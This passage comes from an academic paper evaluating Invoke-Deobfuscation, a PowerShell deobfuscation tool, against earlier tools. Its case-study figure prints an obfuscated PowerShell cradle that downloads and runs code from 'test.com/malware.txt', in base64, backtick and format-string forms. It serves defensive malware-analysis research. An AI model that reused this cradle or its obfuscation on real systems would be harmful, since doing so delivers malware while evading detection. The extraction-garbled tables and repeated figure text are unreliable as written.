9
8
13
0
32
-
8
8
12
0
32
-
25%
25%
37.5%
0%
100%
Result. As shown in Table IV,
there are 32 samples
with network behavior among the obfuscated samples. All of
these scripts’ deobfuscation results of Invoke-Deobfuscation
have the same behavior, far beyond other tools. The reason
is that all deobfuscation processes of Invoke-Deobfuscation
are semantically preserved. PSDecode, PowerDrive and Pow-
erDecode use regex expression to match obfuscated script
pieces, which is not precise so that
identify
any obfuscated script pieces in some obfuscated scripts.
Therefore, the number of their deobfuscation results is less
than the original samples. Li et al. cannot get any samples
they cannot
Fig. 5: The number of key information obtained by
different tools.
Fig. 6: Deobfuscation time of different tools.
Result. As shown in Fig 5, Invoke-Deobfuscation recovers
more key information than the other four tools. Further-
more, on average, 96.8% results of Invoke-Deobfuscation
are the same as that of manual. The reason is that Invoke-
Deobfuscation can identify and recover more obfuscated script
pieces based on the recoverable nodes of AST. The results of
deobfuscation efﬁciency are shown in Fig 6. Overall, Invoke-
Deobfuscation performs efﬁciently and stably,
its average
deobfuscation time is 1.04 seconds which is the minimum in
all tools, and its maximum time is not beyond 4 seconds.
The other tools’ deobfuscation time ﬂuctuates heavily and
may far exceed 10 seconds for some samples. The reason
is that
the other tools may execute the commands which
are not related to deobfuscation, such as network connection,
anti-debugging, etc. Invoke-Deobfuscation can speed up the
process of deobfuscation through avoiding executing these
unrelated commands according to its built-in blocklist.
As shown in Table III, Invoke-Deobfuscation can correctly
recover all scripts with multi-layer obfuscation. Because multi-
layer obfuscated scripts ﬁnally need to be invoke by Invoke-
Expression or PowerShell, Invoke-Deobfuscation can deal with
these scripts as mentioned in section III-B4. PSDecode, Power-
Drive and PowerDecode utilize overriding function to get the
un-obfuscated script. However, overriding function can only
Authorized licensed use limited to: Tsinghua University. Downloaded on August 07,2022 at 13:14:55 UTC from IEEE Xplore.  Restrictions apply. 
8302
'a''a'+'b''a'+'b'  +'c''a'+'b'+'c''a'+'b'+'c''b''c''a''b''c''ab''ab'  +'c'current nodevisited nodeunvisited nodenode’s record 0102030405060708090100PS1 FilePowerShellURLIPOriginDataPSDecodePowerDrivePowerDecodeLi et al.Invoke-DeobfuscationManual0.0100.1001.00010.000100.0001000.0000102030405060708090Deobfuscation Time(s)ObfuscatedScripts PSDecodePowerDrivePowerDecodeLi et al.Invoke-DeobfuscationTABLE V: The proportion of mitigation of obfuscation by different tools.
#Valid Samples
L1
L2
L3
Average Obfuscation
Score Reduced
OriginData
PSDecode
PowerDrive
PowerDecode
Li et al.
Our tool
3,346
631
151
857
1,119
1,800
-
-
24.5% 41.6%
36%
21.1%
17.9%
37%
5.2%
12.4%
91.5% 64.7%
-
6.7%
8.5%
22.3%
37%
27%
-
14%
11%
10.7%
24%
46%
is
its
with network behavior because its replacement is semanti-
cally inconsistent sometimes. For example, when Li et al.
deal with the script pieces New-Object Net.WebClient,
it with the name of
they replace
execution re-
sult object,
i.e., System.Net.WebClient. However,
the replacement
semantically inconsistent and even
System.Net.WebClient is not a valid PowerShell com-
mand.
4) Obfuscation Mitigation: To evaluate the ability of dif-
ferent tools to mitigate obfuscation on complex scripts, we
count and compare the proportion of known obfuscation tech-
niques in the original samples and the deobfuscation samples.
We select 3,346 scripts with the highest obfuscation score
through identifying and scoring known obfuscation techniques.
These scripts contain various obfuscation techniques, whose
size varies from 61 bytes to 17.8MB and about two-thirds of
them are over 100KB, so the deobfuscation time for a single
script may be very long. We limit all tools’ deobfuscation time
to 4 minutes for a single script. Based on recoverable nodes
of AST and regular expression, we can precisely identify each
known obfuscation technique. We utilize the quantiﬁcation
method mentioned in Section IV-B2 to score each script and
calculate the proportion of mitigation of obfuscation.
Result. As shown in Table V, our tool has the most
valid deobfuscation results whose content is not the same
as the obfuscated scripts, and can signiﬁcantly mitigate the
obfuscation at the L1 and L2 levels in these scripts. Base64
encoding is the most common obfuscation at the L3 level
in these scripts, which accounts for 65%. However, base64
strings in most scripts often represent binary ﬁles, which are
decoded into bytes during execution. They cannot be recovered
to strings, so we do not deal with these Base64 strings. Overall,
Invoke-Deobfuscation can considerably reduce the obfuscation
score of these scripts by 46%.
A higher mitigation proportion of the obfuscation at the L3
level does not mean that Li et al. can recover the obfuscation.
As mentioned in section IV-C3, their wrong replacement may
destroy the characteristics of the obfuscation techniques so
that we cannot identify the obfuscation. Wrong replacement
also prevents them from getting the correct recovery results of
L2 level obfuscation. The obfuscation techniques at L2 level
are string-related, and most of them can be recovered using
speciﬁc predeﬁned rules. Therefore, PSDecode, PowerDrive
and PowerDecode can reduce the proportion of mitigation of
these obfuscation techniques. However, as shown in Table II,
the replacement based on predeﬁned rules may not obtain
the correct recovery result. Overriding function can help
PowerDecode deal with some obfuscation at the L3 level,
which is limited to some speciﬁc situations as mentioned in
section IV-C2.
5) Case Study: To visually compare and analyze the deob-
fuscation effects of different tools, we use these tools to deal
with the same case. The case is a PowerShell script with L1,
L2 and L3 obfuscation, which is shown in Fig 7(a).
(a) Original Script
(b) Token Parsing
(c) Recovery based on AST with Variable Tracing
(d) Renaming and Reformatting
Fig. 7: The deobfuscation process of Invoke-Deobfuscation.
In Fig 7,
Invoke-Deobfuscation.
red box is obfuscated script pieces
in the green box is
recovery results
Firstly, we use the case to demonstrate the deobfuscation
the content
process of
and the
in the
content
in each
processing phase. Fig 7(b) shows that Invoke-Deobfuscation
uses token parsing to identify and deal with L1 level
ticking, alias, and random case.
obfuscation,
Invoke-
Then
Deobfuscation identiﬁes the recoverable script piece,
i.e.,
"{2}{0}{1}" -f 'ost h', 'ello', 'write-h',
executing it,
and gets
recovery result
i.e.,
write-host hello. Since
the parameter of
to BinaryExpression node,
after
it
is
according
such as
the
Authorized licensed use limited to: Tsinghua University. Downloaded on August 07,2022 at 13:14:55 UTC from IEEE Xplore.  Restrictions apply. 
9303
"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | ie`x $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (Ne`W-oB`JeCt Net.Web`C`lient).downloadstring($sdfs)Write-Host hello$xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs ='https://test.com/malware.txt'.('iex')(New-Object net.webclient).downloadstring('https://test.com/malware.txt')Write-Host hello$var0 = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$var2 = 'https://test.com/malware.txt'.('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | Invoke-Expression$xdjmd  =   'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs =   '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [text.encoding]::unicode.getstring([convert]::frombase64string($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (New-Object net.webclient).downloadstring($sdfs)TokenParsingDeobfuscationbasedonASTRenaming&ReformatingVariableTracing"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | ie`x $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (Ne`W-oB`JeCt Net.Web`C`lient).downloadstring($sdfs)Write-Host hello$xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs ='https://test.com/malware.txt'.('iex')(New-Object net.webclient).downloadstring('https://test.com/malware.txt')Write-Host hello$var0 = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$var2 = 'https://test.com/malware.txt'.('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | Invoke-Expression$xdjmd  =   'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs =   '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [text.encoding]::unicode.getstring([convert]::frombase64string($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (New-Object net.webclient).downloadstring($sdfs)TokenParsingDeobfuscationbasedonASTRenaming&ReformatingVariableTracing"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | ie`x $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (Ne`W-oB`JeCt Net.Web`C`lient).downloadstring($sdfs)Write-Host hello$xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs ='https://test.com/malware.txt'.('iex')(New-Object net.webclient).downloadstring('https://test.com/malware.txt')Write-Host hello$var0 = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$var2 = 'https://test.com/malware.txt'.('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | Invoke-Expression$xdjmd  =   'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs =   '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [text.encoding]::unicode.getstring([convert]::frombase64string($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (New-Object net.webclient).downloadstring($sdfs)TokenParsingDeobfuscationbasedonASTRenaming&ReformatingVariableTracing"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | ie`x $xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [TeXT.eNcOdINg]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (Ne`W-oB`JeCt Net.Web`C`lient).downloadstring($sdfs)Write-Host hello$xdjmd='aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs ='8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs ='https://test.com/malware.txt'.('iex')(New-Object net.webclient).downloadstring('https://test.com/malware.txt')Write-Host hello$var0 = 'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$var1 = '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$var2 = 'https://test.com/malware.txt'.('iex') (New-Object net.webclient).downloadstring('https://test.com/malware.txt')"{2}{0}{1}" -f 'ost h', 'ello', 'write-h' | Invoke-Expression$xdjmd  =   'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'$lsffs =   '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='$sdfs = [text.encoding]::unicode.getstring([convert]::frombase64string($xdjmd + $lsffs)).($psHoME[4]+$PShOmE[30]+'x') (New-Object net.webclient).downloadstring($sdfs)TokenParsingDeobfuscationbasedonASTRenaming&ReformatingVariableTracingcontinues
Invoke-Deobfuscation
Invoke-Expression,
to
deobfuscate it and gets the ﬁnal recovery result, namely
Write-Host hello. With the help of variable tracing,
Invoke-Deobfuscation recovers the complete malicious URL,
as shown in Fig 7(c). The last line in Fig 7(d) contains a
network connection command downloadstring which is in the
blocklist, so Invoke-Deobfuscation does not process it. After
renaming and reformatting, Invoke-Deobfuscation removes
extra whitespace characters of the script and replaces the
name of all variables with var{num}. The ﬁnal result is
shown in Fig 7(d).
Meanwhile, we use different tools to deal with the case and
their results are shown in Fig 8. The results show that the
other four previous tools can hardly handle the obfuscation in
the case.
(a) PSDecode and PowerDecode
(b) PowerDrive
(c) Li et al.
(d) Invoke-Deobfuscation
Fig. 8: The deobfuscation results of different tools.
We trace the deobfuscation process of these tools and ﬁgure
out the reasons for their failure. The tools based on regular
expression, such as PSDecode, PowerDrive and PowerDecode,
only handle ticking obfuscation. The reason is that
their
regular expression is not precise to identify string reordering
obfuscation in the ﬁrst
they
cannot identify complex Base64 Encoding obfuscation through
regular expression. Furthermore, without context, they cannot
obtain the variables’ value in the fourth line of the case to
recover the obfuscated script piece. PowerDrive transforms
multi-line script into one line to deal with the break lines.
However, as shown in Fig 8, it usually makes the script invalid
in syntax.
line of the case. Moreover,
Because Li et al. can only deal with the obfuscation on
the PipelineAst nodes, so they cannot process the string
reordering obfuscation in the ﬁrst line. Due to the lack of
context, they also cannot process the obfuscation in the fourth
line. Besides, their replacement is semantically inconsistent
so that their deobfuscation result is invalid. They replace the
command New-Object Net.WebClient with the string
of its execution result System.Net.WebClient, which is
not an equivalent replacement. Moreover, the programming
language of Li et al. may cause some unexpected errors, like
the last line in Fig 8(c). They get a string "hlx" because
the variable $PSHome represents the location of the library
System.Management.Automation.PowerShell in their C#
project. However, the variable in PowerShell command line
has a different value.
V. DISCUSSION